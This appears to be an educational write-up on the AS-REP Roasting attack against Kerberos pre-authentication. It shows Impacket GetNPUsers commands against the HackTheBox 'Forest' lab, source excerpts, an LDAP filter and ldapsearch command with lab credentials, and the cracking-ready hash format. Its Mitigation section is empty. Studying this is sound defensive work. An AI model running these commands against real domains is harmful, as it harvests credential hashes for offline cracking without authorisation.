# AS-REP Roasting Attack

## Pre-authentication

### History

The original Kerberos 4 protocol was susceptible to _offline dictionary and brute-force attacks_, since the KDC happily provides a ticket encrypted with the principals’ secret key to any requestor.

### Kerberos V5

[Kerberos 5](./#as-exchange) introduces _pre-authentication_ which requires that requestors prove their identity before the KDC will issue a ticket for a particular principal.

### Implementation

There are [several types of pre-authentication](https://datatracker.ietf.org/doc/html/rfc4120#section-7.5.2) defined by the Kerberos.

However, only the encrypted timestamp (PA-ENC-TIMESTAMP) pre-authentication method is commonly implemented.

{% embed url="https://learning.oreilly.com/library/view/kerberos-the-definitive/0596004036/" %}

### AS-REQ Review

Pre-authentication is controlled by KDC policy.

1. If a client attempts to request initial tickets through the AS exchange, but the pre-authentication is enabled,
2. then the KDC will send a `KRB_ERROR` message which tells the client that pre-authentication is required instead of an AS\_REP.
3. The client append the required pre-authentication data to its AS\_REQ message this time.
4. If the pre-authentication data is accepted, the KDC responds with an AS reply including the TGT ticket. Otherwise, the KDC will response another KRB\_ERROR message that indicates pre-authentication failed.

## ASREPRoasting Attack

## Tools

### Impacket

We use the script [`GetNPUsers.py`](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) to conduct the attack, for example in the HackTheBox lab machine [`Forest`](../../../hackthebox/windows/active-directory/forest.md), we use this script to get the TGT ticket for the user `svc-alfresco`:

```bash
$ impacket-GetNPUsers htb.local/svc-alfresco -no-pass -format hashcat
```

After parsing the arguments, the script initializes the class `GetUserNoPreAuth` with domain account credentials:

```python
    try:
        executer = GetUserNoPreAuth(username, password, domain, options)
        executer.run()
```

If a file of user names is provided, the class call its method `reques_users_file_TGTs` to get the TGT ticket for each account name if the pre-authentication is disabled.

```python
    def run(self):
        if self.__usersFile:
            self.request_users_file_TGTs()
            return
```

If `doKerberos` is set _or_ `no_pass` is false, the script will do the LDAP search to find domain accounts with property `Do not require Kerberos preauthentication` set`UF_DONT_REQUIRE_PREAUTH`:

```python
        # Connect to LDAP
        try:
            ldapConnection = ldap.LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcIP)
...
        # Building the search filter
        searchFilter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)" \
                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % \
                       (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)

        try:
            logging.debug('Search Filter=%s' % searchFilter)
            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                         sizeLimit=999)
```

Also, we can use this filter with the command `ldapsearch` to get the same results:

{% code overflow="wrap" %}
```bash
$ ldapsearch -H ldap://forest -x -b 'dc=htb,dc=local' -D svc-alfresco@htb.local -w s3rvice '(&(UserAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))'
```
{% endcode %}

{% embed url="https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties" %}

Either way, the class will call its method `getTGT` to try to get the TGT ticket for an account.

First, the method prepare the AS\_REQ message:

```python
    def getTGT(self, userName, requestPAC=True):
...
        asReq = AS_REQ()
...
        # from pyasn1.codec.der import decoder, encoder
        message = encoder.encode(asReq)
```

Then it sends the `AS_REQ`, receives, and parses the \`AS\_REP\` response:

```python
        try:
            r = sendReceive(message, domain, self.__kdcIP)
...
        # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
        # 'Do not require Kerberos preauthentication' set
        try:
            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
```

Finally, the script outputs the TGT ticket:

```python
        if self.__outputFormat == 'john':
            # Let's output the TGT enc-part/cipher in John format, in case somebody wants to use it.
            return '$krb5asrep$%s@%s:%s$%s' % (clientName, domain,
                                               hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                               hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
        else:
            # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
            return '$krb5asrep$%d$%s@%s:%s$%s' % ( asRep['enc-part']['etype'], clientName, domain,
                                                   hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                                   hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
```

## Mitigation
